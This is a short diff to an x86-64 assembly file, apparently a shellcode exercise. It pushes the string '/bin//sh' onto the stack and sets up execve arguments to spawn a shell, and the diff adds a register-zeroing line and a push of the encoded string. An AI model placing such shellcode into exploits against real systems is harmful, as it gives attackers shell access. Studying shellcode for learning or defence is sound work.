@@ -7,6 +7,7 @@ section .text
     
 _start:
     xor rax, rax ; zeroes out register
+    xor rbx, rbx
     push rbx ; adds a zero to stack (will terminate string)
     
     mov rdx, [rsp] ; parameter 3 is now 0 (value at top of stack)
@@ -14,6 +15,7 @@ _start:
     ; little endian (reverse order) of characters in "/bin//sh"
     ; notice the string is 8 characters, fills a 8 byte block
     mov rcx, 0x68732f2f6e69622f
+    push rcx
     mov rdi, rsp ; parameter 2 is now char * ("/bin//sh")
     
     push rbx ; adds a zero to terminate array (char * argv[])
